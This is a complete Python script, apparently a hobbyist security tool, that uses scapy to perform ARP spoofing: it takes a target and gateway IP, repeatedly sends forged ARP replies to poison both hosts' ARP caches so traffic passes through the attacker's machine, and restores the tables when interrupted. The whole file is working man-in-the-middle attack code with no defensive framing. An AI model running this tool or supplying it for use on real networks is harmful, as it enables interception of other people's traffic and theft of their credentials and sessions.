#!usr/src/bin python3
import scapy.all as scapy
import time
import argparse


# function to get arguments from the user
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Please specify the target IP Address")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Please specify the gateway IP Address")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("Please specify the target IP address or use --help for more information")
    elif not options.gateway_ip:
        parser.error("Please specify the gateway IP address or use --help for more information")
    else:
        return options.target_ip, options.gateway_ip


# function to get the MAC Address of the IP address passed
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc


# function to ARP Spoofing
def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# function to restore the ARP table from the spoofing attack
def restore(destination_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip), psrc=source_ip, hwsrc=get_mac(source_ip))
    scapy.send(packet, verbose=False, count=4)


# main code
target_ip, gateway_ip = get_arguments()
count_packets = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        print("\r[+] Packets sent " + str(count_packets), end="")
        count_packets = count_packets + 2
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Program detected Ctrl+C... Restoring IP...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[-] Quitting...")
